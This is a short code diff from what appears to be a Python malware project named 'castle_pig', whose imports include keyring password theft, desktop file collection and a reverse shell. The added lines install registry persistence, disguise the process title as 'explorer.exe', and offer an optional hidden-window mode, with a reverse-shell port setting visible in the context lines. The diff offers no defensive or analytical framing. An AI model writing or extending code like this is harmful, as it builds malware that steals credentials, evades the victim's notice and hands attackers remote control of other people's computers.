@@ -7,6 +7,17 @@ import castle_pig.keyring_password
 import castle_pig.desktop_files
 import castle_pig.reverse_shell
 
+import castle_pig.persistence
+# Add registry persistence
+castle_pig.persistence.add_registry_persistence()
+
+import castle_pig.process_blender
+# Set the window title to mimic a legitimate process
+castle_pig.process_blender.set_process_title_windows("explorer.exe")
+# Optionally, run the script with a hidden window (uncomment to use)
+# castle_pig.process_blender.run_hidden_windows()
+
+
 # .env loadenv file is populated 
 # Uncomment below to use and clean up unneeded code
 
@@ -53,6 +64,10 @@ if REVERSE_SHELL_PORT is None:
 else:
     REVERSE_SHELL_PORT = int(REVERSE_SHELL_PORT)
 """
+
+
+
+
 
 # === Configuration ===
 SERVICE_NAME = "CastlePig"
